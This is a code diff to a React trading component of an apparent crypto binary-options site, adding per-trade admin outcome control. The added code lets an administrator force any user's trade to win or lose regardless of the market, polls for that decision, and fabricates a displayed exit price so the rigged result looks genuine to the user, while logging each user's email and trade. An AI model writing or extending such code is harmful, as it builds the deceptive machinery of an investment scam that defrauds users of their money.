@@ -26,22 +26,36 @@ const TRADING_PAIRS = [
   { symbol: 'AVAX/USDT', name: 'Avalanche', icon: '▲' },
 ]
 
+// Get current user from localStorage
+const getCurrentUser = () => {
+  try {
+    const user = localStorage.getItem('currentUser')
+    if (user) return JSON.parse(user)
+    // Fallback to registered user
+    const registeredUsers = JSON.parse(localStorage.getItem('registeredUsers') || '[]')
+    if (registeredUsers.length > 0) return registeredUsers[0]
+    return { id: 'guest_' + Date.now(), email: 'guest@demo.com', name: 'Guest User' }
+  } catch (e) {
+    return { id: 'guest_' + Date.now(), email: 'guest@demo.com', name: 'Guest User' }
+  }
+}
+
 // Real-time price chart component
 function PriceChart({ pair, prices }) {
   const canvasRef = useRef(null)
-  
+
   useEffect(() => {
     const canvas = canvasRef.current
     if (!canvas || prices.length < 2) return
-    
+
     const ctx = canvas.getContext('2d')
     const width = canvas.width
     const height = canvas.height
-    
+
     // Clear canvas
     ctx.fillStyle = '#0b1220'
     ctx.fillRect(0, 0, width, height)
-    
+
     // Draw grid
     ctx.strokeStyle = 'rgba(255,255,255,0.05)'
     ctx.lineWidth = 1
@@ -52,21 +66,21 @@ function PriceChart({ pair, prices }) {
       ctx.lineTo(width, y)
       ctx.stroke()
     }
-    
+
     // Calculate price range
     const minPrice = Math.min(...prices)
     const maxPrice = Math.max(...prices)
     const priceRange = maxPrice - minPrice || 1
-    
+
     // Draw price line
     const gradient = ctx.createLinearGradient(0, 0, width, 0)
     gradient.addColorStop(0, '#7c3aed')
     gradient.addColorStop(1, '#10b981')
-    
+
     ctx.strokeStyle = gradient
     ctx.lineWidth = 2
     ctx.beginPath()
-    
+
     prices.forEach((price, i) => {
       const x = (i / (prices.length - 1)) * width
       const y = height - ((price - minPrice) / priceRange) * (height - 20) - 10
@@ -74,22 +88,22 @@ function PriceChart({ pair, prices }) {
       else ctx.lineTo(x, y)
     })
     ctx.stroke()
-    
+
     // Draw area under line
     const areaGradient = ctx.createLinearGradient(0, 0, 0, height)
     areaGradient.addColorStop(0, 'rgba(124, 58, 237, 0.3)')
     areaGradient.addColorStop(1, 'rgba(124, 58, 237, 0)')
-    
+
     ctx.fillStyle = areaGradient
     ctx.lineTo(width, height)
     ctx.lineTo(0, height)
     ctx.closePath()
     ctx.fill()
-    
+
     // Draw current price line
     const lastPrice = prices[prices.length - 1]
     const lastY = height - ((lastPrice - minPrice) / priceRange) * (height - 20) - 10
-    
+
     ctx.strokeStyle = '#10b981'
     ctx.lineWidth = 1
     ctx.setLineDash([5, 5])
@@ -98,9 +112,9 @@ function PriceChart({ pair, prices }) {
     ctx.lineTo(width, lastY)
     ctx.stroke()
     ctx.setLineDash([])
-    
+
   }, [prices])
-  
+
   return (
     <div className="trade-chart-container">
       <canvas ref={canvasRef} width={400} height={200} className="trade-chart-canvas" />
@@ -112,12 +126,12 @@ function PriceChart({ pair, prices }) {
 function CountdownTimer({ seconds, onComplete, isActive }) {
   const [timeLeft, setTimeLeft] = useState(seconds)
   const [progress, setProgress] = useState(100)
-  
+
   useEffect(() => {
     setTimeLeft(seconds)
     setProgress(100)
   }, [seconds])
-  
+
   useEffect(() => {
     if (!isActive || timeLeft <= 0) {
       if (timeLeft <= 0 && isActive) {
@@ -125,7 +139,7 @@ function CountdownTimer({ seconds, onComplete, isActive }) {
       }
       return
     }
-    
+
     const interval = setInterval(() => {
       setTimeLeft(prev => {
         const newTime = prev - 1
@@ -133,16 +147,16 @@ function CountdownTimer({ seconds, onComplete, isActive }) {
         return newTime
       })
     }, 1000)
-    
+
     return () => clearInterval(interval)
   }, [isActive, timeLeft, seconds, onComplete])
-  
+
   const formatTime = (secs) => {
     const mins = Math.floor(secs / 60)
     const remainingSecs = secs % 60
     return `${mins.toString().padStart(2, '0')}:${remainingSecs.toString().padStart(2, '0')}`
   }
-  
+
   return (
     <div className="countdown-timer">
       <div className="countdown-circle">
@@ -178,6 +192,9 @@ function CountdownTimer({ seconds, onComplete, isActive }) {
 }
 
 export default function Trade({ isOpen, onClose }) {
+  // Get current user
+  const [currentUser] = useState(getCurrentUser)
+
   // Trading state
   const [selectedPair, setSelectedPair] = useState(TRADING_PAIRS[0])
   const [selectedLevel, setSelectedLevel] = useState(null)
@@ -186,54 +203,60 @@ export default function Trade({ isOpen, onClose }) {
   const [isTrading, setIsTrading] = useState(false)
   const [tradeResult, setTradeResult] = useState(null)
   const [entryPrice, setEntryPrice] = useState(null)
-  
+  const [activeTradeId, setActiveTradeId] = useState(null)
+  const [tradeStartTime, setTradeStartTime] = useState(null)
+
   // Price data
   const [currentPrice, setCurrentPrice] = useState(0)
   const [priceHistory, setPriceHistory] = useState([])
   const [priceChange, setPriceChange] = useState(0)
-  
+
   // Trading levels (with admin capability to modify)
   const [tradingLevels, setTradingLevels] = useState(() => {
-    const saved = localStorage.getItem('tradingLevels')
-    return saved ? JSON.parse(saved) : DEFAULT_TRADING_LEVELS
-  })
-  
-  // Admin outcome control - 'auto' = natural, 'win' = force win, 'lose' = force lose
-  // Reads from master admin panel settings
-  const [outcomeControl, setOutcomeControl] = useState(() => {
-    const adminControl = localStorage.getItem('adminTradeControl')
-    if (adminControl) {
-      const parsed = JSON.parse(adminControl)
-      return parsed.mode || 'auto'
+    const saved = localStorage.getItem('adminTradingLevels')
+    if (saved) {
+      const levels = JSON.parse(saved)
+      // Convert admin format to trading format
+      return levels.map(l => ({
+        level: l.id,
+        minCapital: l.minCapital,
+        maxCapital: l.maxCapital,
+        profit: l.profitPercent,
+        duration: l.countdown
+      }))
     }
-    return 'auto'
+    const defaultSaved = localStorage.getItem('tradingLevels')
+    return defaultSaved ? JSON.parse(defaultSaved) : DEFAULT_TRADING_LEVELS
   })
-  
-  // Check for admin control updates from Master Admin Panel
+
+  // Check for admin-set outcome for this specific trade
+  const [forcedOutcome, setForcedOutcome] = useState(null)
+
+  // Poll for admin control decisions
   useEffect(() => {
-    const checkAdminControl = () => {
-      const adminControl = localStorage.getItem('adminTradeControl')
-      if (adminControl) {
-        const parsed = JSON.parse(adminControl)
-        setOutcomeControl(parsed.mode || 'auto')
+    if (!isTrading || !activeTradeId) return
+
+    const checkAdminDecision = () => {
+      const activeTrades = JSON.parse(localStorage.getItem('activeTrades') || '[]')
+      const myTrade = activeTrades.find(t => t.id === activeTradeId)
+
+      if (myTrade && myTrade.adminOutcome && myTrade.adminOutcome !== 'pending') {
+        setForcedOutcome(myTrade.adminOutcome)
       }
     }
-    
-    // Check on mount and periodically
-    checkAdminControl()
-    const interval = setInterval(checkAdminControl, 1000)
+
+    const interval = setInterval(checkAdminDecision, 500)
     return () => clearInterval(interval)
-  }, [])
-  
+  }, [isTrading, activeTradeId])
   // Trade history
   const [tradeHistory, setTradeHistory] = useState(() => {
     const saved = localStorage.getItem('tradeHistory')
     return saved ? JSON.parse(saved) : []
   })
-  
+
   // Real CoinGecko prices storage
   const [coinGeckoPrices, setCoinGeckoPrices] = useState({})
-  
+
   // Fetch real prices from CoinGecko API (same as Dashboard)
   useEffect(() => {
     const fetchPrices = async () => {
@@ -255,20 +278,20 @@ export default function Trade({ isOpen, onClose }) {
         console.log('Using fallback prices')
       }
     }
-    
+
     fetchPrices()
     // Refresh every 30 seconds
     const refreshInterval = setInterval(fetchPrices, 30000)
     return () => clearInterval(refreshInterval)
   }, [])
-  
+
   // Real-time price updates using CoinGecko base price
   useEffect(() => {
     if (!isOpen) return
-    
+
     // Get symbol without /USDT
     const symbol = selectedPair.symbol.split('/')[0]
-    
+
     // Use CoinGecko price if available, otherwise fallback
     const fallbackPrices = {
       'BTC': 94500,
@@ -282,11 +305,11 @@ export default function Trade({ isOpen, onClose }) {
       'MATIC': 0.98,
       'AVAX': 42.5,
     }
-    
+
     let basePrice = coinGeckoPrices[symbol]?.price || fallbackPrices[symbol] || 100
     setCurrentPrice(basePrice)
     setPriceHistory([basePrice])
-    
+
     // Simulate small price movements around the real price
     const interval = setInterval(() => {
       // Refresh base price from CoinGecko if available
@@ -301,10 +324,10 @@ export default function Trade({ isOpen, onClose }) {
         const change = (Math.random() - 0.5) * 2 * volatility
         basePrice = basePrice * (1 + change)
       }
-      
+
       const prevPrice = priceHistory[priceHistory.length - 1] || basePrice
       const changePercent = ((basePrice - prevPrice) / prevPrice) * 100
-      
+
       setCurrentPrice(basePrice)
       setPriceChange(changePercent)
       setPriceHistory(prev => {
@@ -312,39 +335,38 @@ export default function Trade({ isOpen, onClose }) {
         return newHistory.slice(-100) // Keep last 100 points
       })
     }, 1000)
-    
+
     return () => clearInterval(interval)
   }, [isOpen, selectedPair, coinGeckoPrices])
-  
+
   // Determine available level based on trade amount
   useEffect(() => {
     const amount = parseFloat(tradeAmount) || 0
     const level = tradingLevels.find(l => amount >= l.minCapital && amount <= l.maxCapital)
     setSelectedLevel(level || null)
   }, [tradeAmount, tradingLevels])
-  
+
   // Handle trade completion with admin outcome control
   const handleTradeComplete = useCallback(() => {
     if (!entryPrice || !currentPrice || !tradeDirection) return
-    
+
     const priceWentUp = currentPrice > entryPrice
     let naturalWin = (tradeDirection === 'up' && priceWentUp) || (tradeDirection === 'down' && !priceWentUp)
-    
-    // Admin outcome control override
+
+    // Check for admin-forced outcome on this specific trade
     let won = naturalWin
-    if (outcomeControl === 'win') {
+    if (forcedOutcome === 'win') {
       won = true
-    } else if (outcomeControl === 'lose') {
+    } else if (forcedOutcome === 'lose') {
       won = false
     }
-    // 'auto' uses natural outcome
-    
+
     const amount = parseFloat(tradeAmount)
     const profit = won ? amount * (selectedLevel.profit / 100) : -amount
-    
+
     // Generate fake exit price that matches the outcome
     let displayExitPrice = currentPrice
-    if (outcomeControl !== 'auto') {
+    if (forcedOutcome && forcedOutcome !== 'pending') {
       // Manipulate displayed exit price to match forced outcome
       if (won && tradeDirection === 'up') {
         displayExitPrice = entryPrice * 1.001 // Show price went up
@@ -356,8 +378,9 @@ export default function Trade({ isOpen, onClose }) {
         displayExitPrice = entryPrice * 1.001 // Show price went up (loss)
       }
     }
-    
+
     const result = {
+      id: activeTradeId,
       won,
       profit,
       entryPrice,
@@ -366,30 +389,86 @@ export default function Trade({ isOpen, onClose }) {
       pair: selectedPair.symbol,
       amount: amount,
       timestamp: Date.now(),
-      controlled: outcomeControl !== 'auto'
+      userId: currentUser.id,
+      userEmail: currentUser.email,
+      controlled: forcedOutcome !== null && forcedOutcome !== 'pending'
     }
-    
+
     setTradeResult(result)
     setIsTrading(false)
-    
-    // Save to trade history for admin
+
+    // Remove from active trades
+    const activeTrades = JSON.parse(localStorage.getItem('activeTrades') || '[]')
+    const updatedActive = activeTrades.filter(t => t.id !== activeTradeId)
+    localStorage.setItem('activeTrades', JSON.stringify(updatedActive))
+
+    // Save to completed trade history
+    const tradeRecord = {
+      id: activeTradeId,
+      date: new Date().toISOString(),
+      user: currentUser.email,
+      userId: currentUser.id,
+      asset: selectedPair.symbol,
+      direction: tradeDirection,
+      amount: amount,
+      result: won ? 'win' : 'loss',
+      profit: profit,
+      entryPrice: entryPrice,
+      exitPrice: displayExitPrice,
+      level: selectedLevel.level,
+      duration: selectedLevel.duration,
+      controlled: forcedOutcome !== null && forcedOutcome !== 'pending'
+    }
+
     setTradeHistory(prev => {
-      const updated = [result, ...prev].slice(0, 50) // Keep last 50 trades
+      const updated = [tradeRecord, ...prev].slice(0, 100)
       localStorage.setItem('tradeHistory', JSON.stringify(updated))
       return updated
     })
-  }, [entryPrice, currentPrice, tradeDirection, tradeAmount, selectedLevel, outcomeControl, selectedPair])
-  
+
+    // Reset forced outcome
+    setForcedOutcome(null)
+    setActiveTradeId(null)
+  }, [entryPrice, currentPrice, tradeDirection, tradeAmount, selectedLevel, forcedOutcome, selectedPair, activeTradeId, currentUser])
+
   // Start trade
   const startTrade = (direction) => {
     if (!selectedLevel || !tradeAmount) return
-    
+
+    const tradeId = 'trade_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9)
+    const startTime = Date.now()
+
     setTradeDirection(direction)
     setEntryPrice(currentPrice)
     setIsTrading(true)
     setTradeResult(null)
+    setActiveTradeId(tradeId)
+    setTradeStartTime(startTime)
+    setForcedOutcome(null)
+
+    // Save to active trades for admin monitoring
+    const activeTrade = {
+      id: tradeId,
+      userId: currentUser.id,
+      userEmail: currentUser.email,
+      userName: currentUser.name || currentUser.email,
+      pair: selectedPair.symbol,
+      direction: direction,
+      amount: parseFloat(tradeAmount),
+      entryPrice: currentPrice,
+      level: selectedLevel.level,
+      duration: selectedLevel.duration,
+      profitPercent: selectedLevel.profit,
+      startTime: startTime,
+      endTime: startTime + (selectedLevel.duration * 1000),
+      adminOutcome: 'pending', // pending, win, lose
+      status: 'active'
+    }
+
+    const activeTrades = JSON.parse(localStorage.getItem('activeTrades') || '[]')
+    localStorage.setItem('activeTrades', JSON.stringify([...activeTrades, activeTrade]))
   }
-  
+
   // Reset trade
   const resetTrade = () => {
     setTradeDirection(null)
@@ -397,15 +476,18 @@ export default function Trade({ isOpen, onClose }) {
     setIsTrading(false)
     setTradeResult(null)
     setTradeAmount('')
+    setActiveTradeId(null)
+    setTradeStartTime(null)
+    setForcedOutcome(null)
   }
-  
+
   // Format price
   const formatPrice = (price) => {
     if (price >= 1000) return price.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })
     if (price >= 1) return price.toFixed(4)
     return price.toFixed(6)
   }
-  
+
   // Format duration
   const formatDuration = (seconds) => {
     if (seconds >= 3600) return `${(seconds / 3600).toFixed(1)}h`
@@ -459,11 +541,10 @@ export default function Trade({ isOpen, onClose }) {
           <label>Trading Levels</label>
           <div className="levels-grid">
             {tradingLevels.map((level, index) => (
-              <div 
+              <div
                 key={level.level}
-                className={`level-card ${selectedLevel?.level === level.level ? 'active' : ''} ${
-                  parseFloat(tradeAmount) >= level.minCapital && parseFloat(tradeAmount) <= level.maxCapital ? 'available' : ''
-                }`}
+                className={`level-card ${selectedLevel?.level === level.level ? 'active' : ''} ${parseFloat(tradeAmount) >= level.minCapital && parseFloat(tradeAmount) <= level.maxCapital ? 'available' : ''
+                  }`}
               >
                 <div className="level-header">Level {level.level}</div>
                 <div className="level-capital">
@@ -498,7 +579,7 @@ export default function Trade({ isOpen, onClose }) {
             </div>
 
             <div className="trade-direction-btns">
-              <button 
+              <button
                 className="direction-btn up"
                 onClick={() => startTrade('up')}
                 disabled={!selectedLevel}
@@ -507,7 +588,7 @@ export default function Trade({ isOpen, onClose }) {
                 <span className="direction-label">UP</span>
                 <span className="direction-desc">Price will rise</span>
               </button>
-              <button 
+              <button
                 className="direction-btn down"
                 onClick={() => startTrade('down')}
                 disabled={!selectedLevel}
@@ -547,22 +628,21 @@ export default function Trade({ isOpen, onClose }) {
                 </span>
               </div>
             </div>
-            
-            <CountdownTimer 
+
+            <CountdownTimer
               seconds={selectedLevel.duration}
               onComplete={handleTradeComplete}
               isActive={isTrading}
             />
-            
+
             <div className="trade-progress-bar">
-              <div 
-                className={`progress-fill ${
-                  (tradeDirection === 'up' && currentPrice > entryPrice) ||
+              <div
+                className={`progress-fill ${(tradeDirection === 'up' && currentPrice > entryPrice) ||
                   (tradeDirection === 'down' && currentPrice < entryPrice)
-                    ? 'winning' : 'losing'
-                }`}
-                style={{ 
-                  width: `${Math.min(100, Math.abs(((currentPrice - entryPrice) / entryPrice) * 10000))}%` 
+                  ? 'winning' : 'losing'
+                  }`}
+                style={{
+                  width: `${Math.min(100, Math.abs(((currentPrice - entryPrice) / entryPrice) * 10000))}%`
                 }}
               />
             </div>
